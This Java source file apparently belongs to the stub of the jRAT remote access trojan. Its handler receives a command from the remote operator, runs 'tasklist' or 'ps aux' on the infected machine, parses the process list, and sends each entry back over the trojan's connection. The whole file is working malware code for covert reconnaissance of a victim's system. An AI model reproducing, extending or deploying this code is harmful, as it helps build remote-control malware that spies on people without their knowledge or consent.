package se.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.common.utils.DataUnits;
import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet25Process;

import com.redpois0n.oslib.OperatingSystem;


public class Packet19ListProcesses extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		boolean icons = con.readBoolean();
		
		try {
			Process p = null;
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			} else {
				p = Runtime.getRuntime().exec("ps aux");
			}

			if (p != null) {
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
					reader.readLine();
				}
				
				String line;

				while ((line = reader.readLine()) != null) {		
					if (line.length() > 0) {
						con.addToSendQueue(new Packet25Process(parse(line)));
					}
				}
				reader.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	} 
	
	public static final String[] parse(String line) {
		String[] data = new String[4];
		
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			line = line.replace("\"", "").replace("�", "");
			String[] args = line.split(",");

			data[0] = args[0]; // name
			data[1] = args[1]; // pid
			data[2] = args[2]; // type / user
			data[3] = args[4]; // memory usage
			
			data[3] = DataUnits.getAsString(Long.parseLong(data[3].split(" ")[0]) * 1000);
		} else {
			line = line.trim().replaceAll("( )+", " ");
			String[] args = line.split(" ");

			data[0] = args[args.length - 1];
			data[1] = args[2];
			data[2] = args[0];
			data[3] = args[3];
		}

		for (int i = 0; i < data.length; i++) {
			if (data[i] == null) {
				data[i] = "";
			}
		}
		
		return data;
	}

}
